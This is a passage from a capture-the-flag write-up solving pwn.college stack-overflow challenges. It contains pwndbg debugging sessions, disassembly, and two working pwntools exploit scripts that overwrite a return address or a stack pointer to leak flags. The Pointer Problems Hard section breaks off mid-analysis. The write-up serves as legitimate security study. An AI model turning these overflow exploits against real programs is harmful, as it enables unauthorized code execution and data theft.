───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

* [x] Location of buffer: `0x7ffec1695f10`
* [ ] Location of stored return address to `main()`
* [ ] Location of `win()`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffec1695f60:
 rip = 0x40174f in challenge; saved rip = 0x401862
 called by frame at 0x7ffec1696f90
 Arglist at 0x7ffec1695f50, args: 
 Locals at 0x7ffec1695f50, Previous frame's sp is 0x7ffec1695f60
 Saved registers:
  rbp at 0x7ffec1695f50, rip at 0x7ffec1695f58
```

* [x] Location of buffer: `0x7ffec1695f10`
* [x] Location of stored return address to `main()`: `0x7ffec1695f58`
* [ ] Location of `win()`

```
pwndbg> info address win
Symbol "win" is at 0x4014e9 in a file compiled without debugging.
```

* [x] Location of buffer: `0x7ffec1695f10`
* [x] Location of stored return address to `main()`: `0x7ffec1695f58`
* [x] Location of `win()`: `0x4014e9`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/casting-catastrophe-hard')

# Initialize values
buffer_addr = 0x7ffec1695f10
addr_of_stored_ip = 0x7ffec1695f58
win_func_addr = 0x4014e9

# Calculate offset & payload_size
offset = addr_of_stored_ip - buffer_addr
records_num = 65536
records_size = 65536

# Build payload
payload = b"A" * offset
payload += p64(win_func_addr)

# Send number of records
p.recvuntil(b'Number of payload records to send: ')
p.sendline(str(records_num))

# Send size of records
p.recvuntil(b'Size of each payload record: ')
p.sendline(str(records_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~casting-catastrophe-hard:~$ python ~/script.py 
[+] Starting local process '/challenge/casting-catastrophe-hard': pid 5355
/home/hacker/script.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(records_num))
/home/hacker/script.py:25: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(records_size))
[*] Switching to interactive mode
 (up to 4294967296 bytes)!
[*] Process '/challenge/casting-catastrophe-hard' stopped with exit code -11 (SIGSEGV) (pid 5355)
Goodbye!
You win! Here is your flag:
pwn.college{IJd8sr_N9kk7rRD9zwIz4XoDVHP.0FO5IDL4ITM0EzW}


[*] Got EOF while reading in interactive
$ 
```

&nbsp;

## Pointer Problems (Easy)

```
hacker@program-security~pointer-problems-easy:~$ /challenge/pointer-problems-easy 
In this level, the flag will be loaded into the bss section of memory.
However, at no point will this program actually print the buffer storing the flag.
Reading flag into memory...
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe3b8a8580 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffe3b8a8588 (rsp+0x0008) | 68 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9768 |
| 0x00007ffe3b8a8590 (rsp+0x0010) | 58 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9758 |
| 0x00007ffe3b8a8598 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffe3b8a85a0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85a8 (rsp+0x0028) | a0 16 ef 0c 51 70 00 00 | 0x000070510cef16a0 |
| 0x00007ffe3b8a85b0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85b8 (rsp+0x0038) | 60 40 99 09 2f 5f 00 00 | 0x00005f2f09994060 |
| 0x00007ffe3b8a85c0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85c8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85d0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85d8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85e0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85e8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85f0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85f8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a8600 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a8608 (rsp+0x0088) | 9b 41 99 09 2f 5f 00 00 | 0x00005f2f0999419b |
| 0x00007ffe3b8a8610 (rsp+0x0090) | a0 11 99 09 2f 5f 00 00 | 0x00005f2f099911a0 |
| 0x00007ffe3b8a8618 (rsp+0x0098) | 00 5e 42 2f 40 62 a6 5c | 0x5ca662402f425e00 |
| 0x00007ffe3b8a8620 (rsp+0x00a0) | 60 96 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9660 |
| 0x00007ffe3b8a8628 (rsp+0x00a8) | d7 1b 99 09 2f 5f 00 00 | 0x00005f2f09991bd7 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffe3b8a8580, and our base pointer points to 0x7ffe3b8a8620.
This means that we have (decimal) 22 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 176 bytes.
The input buffer begins at 0x7ffe3b8a85c0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 65 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

This challenge has a char* on the stack that will be printed after parsing your input.
The char* is located at 0x7ffe3b8a8608, 72 bytes after the start of your input buffer.
The flag  is located at 0x5f2f09994060.

Pay close attention to how these values relate now, because they will change every time you run the program due to ASLR!

Payload size: 2
Send your payload (up to 2 bytes)!
aa
You sent 2 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe3b8a8580 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffe3b8a8588 (rsp+0x0008) | 68 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9768 |
| 0x00007ffe3b8a8590 (rsp+0x0010) | 58 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9758 |
| 0x00007ffe3b8a8598 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffe3b8a85a0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85a8 (rsp+0x0028) | a0 16 ef 0c 02 00 00 00 | 0x000000020cef16a0 |
| 0x00007ffe3b8a85b0 (rsp+0x0030) | 02 00 00 00 00 00 00 00 | 0x0000000000000002 |
| 0x00007ffe3b8a85b8 (rsp+0x0038) | 60 40 99 09 2f 5f 00 00 | 0x00005f2f09994060 |
| 0x00007ffe3b8a85c0 (rsp+0x0040) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
| 0x00007ffe3b8a85c8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85d0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85d8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85e0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85e8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85f0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85f8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a8600 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a8608 (rsp+0x0088) | 9b 41 99 09 2f 5f 00 00 | 0x00005f2f0999419b |
| 0x00007ffe3b8a8610 (rsp+0x0090) | a0 11 99 09 2f 5f 00 00 | 0x00005f2f099911a0 |
| 0x00007ffe3b8a8618 (rsp+0x0098) | 00 5e 42 2f 40 62 a6 5c | 0x5ca662402f425e00 |
| 0x00007ffe3b8a8620 (rsp+0x00a0) | 60 96 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9660 |
| 0x00007ffe3b8a8628 (rsp+0x00a8) | d7 1b 99 09 2f 5f 00 00 | 0x00005f2f09991bd7 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffe3b8a85c0

Calling printf() to printf with the pointer...
The string on the stack is: This is a string in the bss!
Goodbye!
```

This challenge prints whatever string is pointed to by the `char*` pointer.
So in order to solve this challenge, we just need to overflow the buffer, and overwrite the `char*` pointer with the address of the flag.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *
import re

p = process('/challenge/pointer-problems-easy')

output = p.recvuntil(b'Payload size:')

# input buffer base
buffer_addr = int(re.search(rb'input buffer begins at (0x[0-9a-fA-F]+)', output).group(1), 16)
# the target char* pointer on stack
char_ptr_addr = int(re.search(rb'The char\* is located at (0x[0-9a-fA-F]+)', output).group(1), 16)
# the flag's address in the bss
flag_addr = int(re.search(rb'The flag\s+is located at (0x[0-9a-fA-F]+)', output).group(1), 16)

# Calculate offset & payload_size
offset = char_ptr_addr - buffer_addr
payload_size = offset + 8

# Log info
log.success(f"Input Buffer     @ {hex(buffer_addr)}")
log.success(f"Pointer          @ {hex(char_ptr_addr)}")
log.success(f"Flag Addr        @ {hex(flag_addr)}")
log.success(f"Offset:            {offset} bytes")

# Build payload
payload = b"A" * offset
payload += p64(flag_addr)

# Send payload size (this is what's actually asked for now)
p.sendline(str(payload_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~pointer-problems-easy:~$ python ~/script.py 
[+] Starting local process '/challenge/pointer-problems-easy': pid 10061
[+] Input Buffer     @ 0x7fff3881eef0
[+] Pointer          @ 0x7fff3881ef38
[+] Flag Addr        @ 0x60eb05b09060
[+] Offset:        72 bytes
/home/hacker/script.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(payload_size))
[*] Switching to interactive mode
 (up to 80 bytes)!
[*] Process '/challenge/pointer-problems-easy' stopped with exit code 0 (pid 10061)
You sent 80 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff3881eeb0 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007fff3881eeb8 (rsp+0x0008) | 98 00 82 38 ff 7f 00 00 | 0x00007fff38820098 |
| 0x00007fff3881eec0 (rsp+0x0010) | 88 00 82 38 ff 7f 00 00 | 0x00007fff38820088 |
| 0x00007fff3881eec8 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007fff3881eed0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff3881eed8 (rsp+0x0028) | a0 26 8b 28 50 00 00 00 | 0x00000050288b26a0 |
| 0x00007fff3881eee0 (rsp+0x0030) | 50 00 00 00 00 00 00 00 | 0x0000000000000050 |
| 0x00007fff3881eee8 (rsp+0x0038) | 60 90 b0 05 eb 60 00 00 | 0x000060eb05b09060 |
| 0x00007fff3881eef0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881eef8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef00 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef08 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef10 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef18 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef20 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef28 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef30 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef38 (rsp+0x0088) | 60 90 b0 05 eb 60 00 00 | 0x000060eb05b09060 |
| 0x00007fff3881ef40 (rsp+0x0090) | a0 61 b0 05 eb 60 00 00 | 0x000060eb05b061a0 |
| 0x00007fff3881ef48 (rsp+0x0098) | 00 6a 41 67 8a 54 dd 39 | 0x39dd548a67416a00 |
| 0x00007fff3881ef50 (rsp+0x00a0) | 90 ff 81 38 ff 7f 00 00 | 0x00007fff3881ff90 |
| 0x00007fff3881ef58 (rsp+0x00a8) | d7 6b b0 05 eb 60 00 00 | 0x000060eb05b06bd7 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff3881eef0

Calling printf() to printf with the pointer...
The string on the stack is: pwn.college{4ZdIy0Nf3F6-aPumXmZU4nCFOmO.QXygzN4EDL4ITM0EzW} 

Goodbye!
[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Pointer Problems (Hard)

```
hacker@program-security~pointer-problems-hard:/$ /challenge/pointer-problems-hard 
In this level, the flag will be loaded into the bss section of memory.
However, at no point will this program actually print the buffer storing the flag.
Reading flag into memory
Payload size: 
```

We need the following:
- [ ] Location of buffer
- [ ] Location of `char*` to array
- [ ] Offset of the flag

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000010d0  __cxa_finalize@plt
0x00000000000010e0  __errno_location@plt
0x00000000000010f0  puts@plt
0x0000000000001100  __stack_chk_fail@plt
0x0000000000001110  printf@plt
0x0000000000001120  read@plt
0x0000000000001130  setvbuf@plt
0x0000000000001140  open@plt
0x0000000000001150  __isoc99_scanf@plt
0x0000000000001160  exit@plt
0x0000000000001170  strerror@plt
0x0000000000001180  _start
0x00000000000011b0  deregister_tm_clones
0x00000000000011e0  register_tm_clones
0x0000000000001220  __do_global_dtors_aux
0x0000000000001260  frame_dummy
0x0000000000001269  bin_padding
0x0000000000001ef8  challenge
0x00000000000020d2  main
0x0000000000002190  __libc_csu_init
0x0000000000002200  __libc_csu_fini
0x0000000000002208  _fini
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000001ef8 <+0>:     endbr64
   0x0000000000001efc <+4>:     push   rbp
   0x0000000000001efd <+5>:     mov    rbp,rsp
   0x0000000000001f00 <+8>:     sub    rsp,0xd0
   0x0000000000001f07 <+15>:    mov    DWORD PTR [rbp-0xb4],edi
   0x0000000000001f0d <+21>:    mov    QWORD PTR [rbp-0xc0],rsi
   0x0000000000001f14 <+28>:    mov    QWORD PTR [rbp-0xc8],rdx
   0x0000000000001f1b <+35>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001f24 <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001f28 <+48>:    xor    eax,eax
   0x0000000000001f2a <+50>:    lea    rdx,[rbp-0x90]
   0x0000000000001f31 <+57>:    mov    eax,0x0
   0x0000000000001f36 <+62>:    mov    ecx,0x11
   0x0000000000001f3b <+67>:    mov    rdi,rdx
   0x0000000000001f3e <+70>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000001f41 <+73>:    lea    rax,[rip+0x30f8]        # 0x5040 <bssdata>
   0x0000000000001f48 <+80>:    mov    QWORD PTR [rbp-0x98],rax
   0x0000000000001f4f <+87>:    lea    rax,[rip+0x3262]        # 0x51b8 <bssdata+376>
   0x0000000000001f56 <+94>:    mov    QWORD PTR [rbp-0x10],rax
   0x0000000000001f5a <+98>:    movabs rax,0x2073692073696854
   0x0000000000001f64 <+108>:   movabs rdx,0x676e697274732061
   0x0000000000001f6e <+118>:   mov    QWORD PTR [rip+0x3243],rax        # 0x51b8 <bssdata+376>
   0x0000000000001f75 <+125>:   mov    QWORD PTR [rip+0x3244],rdx        # 0x51c0 <bssdata+384>
   0x0000000000001f7c <+132>:   movabs rax,0x20656874206e6920
   0x0000000000001f86 <+142>:   mov    QWORD PTR [rip+0x323b],rax        # 0x51c8 <bssdata+392>
   0x0000000000001f8d <+149>:   mov    DWORD PTR [rip+0x3239],0x21737362        # 0x51d0 <bssdata+400>
   0x0000000000001f97 <+159>:   mov    BYTE PTR [rip+0x3236],0x0        # 0x51d4 <bssdata+404>
   0x0000000000001f9e <+166>:   lea    rdi,[rip+0x1063]        # 0x3008
   0x0000000000001fa5 <+173>:   call   0x10f0 <puts@plt>
   0x0000000000001faa <+178>:   lea    rdi,[rip+0x109f]        # 0x3050
   0x0000000000001fb1 <+185>:   call   0x10f0 <puts@plt>
   0x0000000000001fb6 <+190>:   lea    rdi,[rip+0x10e6]        # 0x30a3
   0x0000000000001fbd <+197>:   call   0x10f0 <puts@plt>
   0x0000000000001fc2 <+202>:   mov    esi,0x0
   0x0000000000001fc7 <+207>:   lea    rdi,[rip+0x10f1]        # 0x30bf
   0x0000000000001fce <+214>:   mov    eax,0x0
   0x0000000000001fd3 <+219>:   call   0x1140 <open@plt>
   0x0000000000001fd8 <+224>:   mov    edx,0x100
   0x0000000000001fdd <+229>:   lea    rsi,[rip+0x305c]        # 0x5040 <bssdata>
   0x0000000000001fe4 <+236>:   mov    edi,eax
   0x0000000000001fe6 <+238>:   call   0x1120 <read@plt>
   0x0000000000001feb <+243>:   mov    QWORD PTR [rbp-0xa0],0x0
   0x0000000000001ff6 <+254>:   lea    rdi,[rip+0x10c8]        # 0x30c5
   0x0000000000001ffd <+261>:   mov    eax,0x0
   0x0000000000002002 <+266>:   call   0x1110 <printf@plt>
   0x0000000000002007 <+271>:   lea    rax,[rbp-0xa0]
   0x000000000000200e <+278>:   mov    rsi,rax
   0x0000000000002011 <+281>:   lea    rdi,[rip+0x10bc]        # 0x30d4
   0x0000000000002018 <+288>:   mov    eax,0x0
   0x000000000000201d <+293>:   call   0x1150 <__isoc99_scanf@plt>
   0x0000000000002022 <+298>:   mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000002029 <+305>:   mov    rsi,rax
   0x000000000000202c <+308>:   lea    rdi,[rip+0x10a5]        # 0x30d8
   0x0000000000002033 <+315>:   mov    eax,0x0
   0x0000000000002038 <+320>:   call   0x1110 <printf@plt>
   0x000000000000203d <+325>:   mov    rdx,QWORD PTR [rbp-0xa0]
   0x0000000000002044 <+332>:   lea    rax,[rbp-0x90]
   0x000000000000204b <+339>:   mov    rsi,rax
   0x000000000000204e <+342>:   mov    edi,0x0
   0x0000000000002053 <+347>:   call   0x1120 <read@plt>
   0x0000000000002058 <+352>:   mov    DWORD PTR [rbp-0xa4],eax
   0x000000000000205e <+358>:   cmp    DWORD PTR [rbp-0xa4],0x0
   0x0000000000002065 <+365>:   jns    0x2093 <challenge+411>
   0x0000000000002067 <+367>:   call   0x10e0 <__errno_location@plt>
   0x000000000000206c <+372>:   mov    eax,DWORD PTR [rax]
   0x000000000000206e <+374>:   mov    edi,eax
   0x0000000000002070 <+376>:   call   0x1170 <strerror@plt>
   0x0000000000002075 <+381>:   mov    rsi,rax
   0x0000000000002078 <+384>:   lea    rdi,[rip+0x1081]        # 0x3100
   0x000000000000207f <+391>:   mov    eax,0x0
   0x0000000000002084 <+396>:   call   0x1110 <printf@plt>
   0x0000000000002089 <+401>:   mov    edi,0x1
   0x000000000000208e <+406>:   call   0x1160 <exit@plt>
   0x0000000000002093 <+411>:   mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000002097 <+415>:   mov    rsi,rax
   0x000000000000209a <+418>:   lea    rdi,[rip+0x1087]        # 0x3128
   0x00000000000020a1 <+425>:   mov    eax,0x0
   0x00000000000020a6 <+430>:   call   0x1110 <printf@plt>
   0x00000000000020ab <+435>:   lea    rdi,[rip+0x1096]        # 0x3148
   0x00000000000020b2 <+442>:   call   0x10f0 <puts@plt>
   0x00000000000020b7 <+447>:   mov    eax,0x0
   0x00000000000020bc <+452>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000000020c0 <+456>:   xor    rcx,QWORD PTR fs:0x28
   0x00000000000020c9 <+465>:   je     0x20d0 <challenge+472>
   0x00000000000020cb <+467>:   call   0x1100 <__stack_chk_fail@plt>
   0x00000000000020d0 <+472>:   leave
   0x00000000000020d1 <+473>:   ret
End of assembler dump.
```

Immediately we can see that the `open@plt` and `read@plt` are being chained in such a way which denotes the opening and reading of the `/flag` file's contents.
We can see that the flag is read at an offset of `0x5040` which falls in the `.bss` section.

```
# ---- snip ----

   0x0000000000001fd8 <+224>:   mov    edx,0x100
   0x0000000000001fdd <+229>:   lea    rsi,[rip+0x305c]        # 0x5040 <bssdata>
   0x0000000000001fe4 <+236>:   mov    edi,eax
   0x0000000000001fe6 <+238>:   call   0x1120 <read@plt>

# ---- snip ----
```

- [ ] Location of buffer
- [ ] Location of `char*` to array
- [x] Offset of the flag: `0x5040`

There is a `read@plt` happening at `challenge+347`.
Let's put a breakpoint and run the program.

347 411

```
pwndbg> break *(challenge+347)
Breakpoint 1 at 0x2053
```

```
pwndbg> run
Starting program: /challenge/pointer-problems-hard 
In this level, the flag will be loaded into the bss section of memory.
However, at no point will this program actually print the buffer storing the flag.
Reading flag into memory...
Payload size: 10
Send your payload (up to 10 bytes)!

Breakpoint 1, 0x00006133f8e3d053 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffec3de8700 ◂— 0
 RBX  0x6133f8e3d190 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  0xa
 RDI  0
 RSI  0x7ffec3de8700 ◂— 0
 R8   0x24
 R9   0x24
 R10  0x6133f8e3e0f4 ◂— ' bytes)!\n'
 R11  0x246
 R12  0x6133f8e3c180 (_start) ◂— endbr64 
 R13  0x7ffec3de98c0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffec3de8790 —▸ 0x7ffec3de97d0 ◂— 0
 RSP  0x7ffec3de86c0 ◂— 8
 RIP  0x6133f8e3d053 (challenge+347) ◂— call read@plt
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x6133f8e3d053 <challenge+347>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffec3de8700 ◂— 0
        nbytes: 0xa
 
   0x6133f8e3d058 <challenge+352>    mov    dword ptr [rbp - 0xa4], eax
   0x6133f8e3d05e <challenge+358>    cmp    dword ptr [rbp - 0xa4], 0
   0x6133f8e3d065 <challenge+365>    jns    challenge+411               <challenge+411>
 
   0x6133f8e3d067 <challenge+367>    call   __errno_location@plt        <__errno_location@plt>
 
   0x6133f8e3d06c <challenge+372>    mov    eax, dword ptr [rax]
   0x6133f8e3d06e <challenge+374>    mov    edi, eax
   0x6133f8e3d070 <challenge+376>    call   strerror@plt                <strerror@plt>
 
   0x6133f8e3d075 <challenge+381>    mov    rsi, rax
   0x6133f8e3d078 <challenge+384>    lea    rdi, [rip + 0x1081]     RDI => 0x6133f8e3e100 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x6133f8e3d07f <challenge+391>    mov    eax, 0                  EAX => 0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffec3de86c0 ◂— 8
01:0008│-0c8 0x7ffec3de86c8 —▸ 0x7ffec3de98d8 —▸ 0x7ffec3dea692 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-0c0 0x7ffec3de86d0 —▸ 0x7ffec3de98c8 —▸ 0x7ffec3dea671 ◂— '/challenge/pointer-problems-hard'
03:0018│-0b8 0x7ffec3de86d8 ◂— 0x1001be6a0
04:0020│-0b0 0x7ffec3de86e0 ◂— 0x1be6a0
05:0028│-0a8 0x7ffec3de86e8 ◂— 0x1c
06:0030│-0a0 0x7ffec3de86f0 ◂— 0xa /* '\n' */
07:0038│-098 0x7ffec3de86f8 —▸ 0x6133f8e40040 (bssdata) ◂— 0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x6133f8e3d053 challenge+347
   1   0x6133f8e3d167 main+149
   2   0x7f2bf2060083 __libc_start_main+243
   3   0x6133f8e3c1ae _start+46
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffec3de8700`
- [ ] Location of `char*` to array
- [x] Offset of the flag: `0x5040`

There is a call to `printf@plt` made at `challenge+430`.

```
# ---- snip ----

   0x0000000000002093 <+411>:   mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000002097 <+415>:   mov    rsi,rax
   0x000000000000209a <+418>:   lea    rdi,[rip+0x1087]        # 0x3128
   0x00000000000020a1 <+425>:   mov    eax,0x0
   0x00000000000020a6 <+430>:   call   0x1110 <printf@plt>

# ---- snip ----
```

We know that the argument which is placed in `rsi` is the string on the stack. This argument is moved in `rsi` from `rax` into which it is moved from `[rbp-0x10]`. 
This tells us that the `char*` is at `rbp-0x10`. Lets set a breakpoint and continue.

```
pwndbg> break *(challenge+411)
Breakpoint 2 at 0x2093
```

```
pwndbg> c
Continuing.
aaaa

Breakpoint 2, 0x00006133f8e3d093 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────
*RAX  5
 RBX  0x6133f8e3d190 (__libc_csu_init) ◂— endbr64 
*RCX  0x7f2bf214a1f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0xa
 RDI  0
 RSI  0x7ffec3de8700 ◂— 0xa61616161 /* 'aaaa\n' */
 R8   0x24
 R9   0x24
 R10  0x6133f8e3e0f4 ◂— ' bytes)!\n'
 R11  0x246
 R12  0x6133f8e3c180 (_start) ◂— endbr64 
 R13  0x7ffec3de98c0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffec3de8790 —▸ 0x7ffec3de97d0 ◂— 0
 RSP  0x7ffec3de86c0 ◂— 8
*RIP  0x6133f8e3d093 (challenge+411) ◂— mov rax, qword ptr [rbp - 0x10]
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x6133f8e3d093 <challenge+411>    mov    rax, qword ptr [rbp - 0x10]     RAX, [0x7ffec3de8780] => 0x6133f8e401b8 (bssdata+376) ◂— 'This is a string in the bss!'
   0x6133f8e3d097 <challenge+415>    mov    rsi, rax                        RSI => 0x6133f8e401b8 (bssdata+376) ◂— 'This is a string in the bss!'
   0x6133f8e3d09a <challenge+418>    lea    rdi, [rip + 0x1087]             RDI => 0x6133f8e3e128 ◂— 'The string on the stack is: %s\n'
   0x6133f8e3d0a1 <challenge+425>    mov    eax, 0                          EAX => 0
   0x6133f8e3d0a6 <challenge+430>    call   printf@plt                  <printf@plt>
 
   0x6133f8e3d0ab <challenge+435>    lea    rdi, [rip + 0x1096]     RDI => 0x6133f8e3e148 ◂— 'Goodbye!'
   0x6133f8e3d0b2 <challenge+442>    call   puts@plt                    <puts@plt>
 
   0x6133f8e3d0b7 <challenge+447>    mov    eax, 0                       EAX => 0
   0x6133f8e3d0bc <challenge+452>    mov    rcx, qword ptr [rbp - 8]
   0x6133f8e3d0c0 <challenge+456>    xor    rcx, qword ptr fs:[0x28]
   0x6133f8e3d0c9 <challenge+465>    je     challenge+472               <challenge+472>
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffec3de86c0 ◂— 8
01:0008│-0c8 0x7ffec3de86c8 —▸ 0x7ffec3de98d8 —▸ 0x7ffec3dea692 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-0c0 0x7ffec3de86d0 —▸ 0x7ffec3de98c8 —▸ 0x7ffec3dea671 ◂— '/challenge/pointer-problems-hard'
03:0018│-0b8 0x7ffec3de86d8 ◂— 0x1001be6a0
04:0020│-0b0 0x7ffec3de86e0 ◂— 0x1be6a0
05:0028│-0a8 0x7ffec3de86e8 ◂— 0x50000001c
06:0030│-0a0 0x7ffec3de86f0 ◂— 0xa /* '\n' */
07:0038│-098 0x7ffec3de86f8 —▸ 0x6133f8e40040 (bssdata) ◂— 0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x6133f8e3d093 challenge+411
   1   0x6133f8e3d167 main+149
   2   0x7f2bf2060083 __libc_start_main+243
   3   0x6133f8e3c1ae _start+46
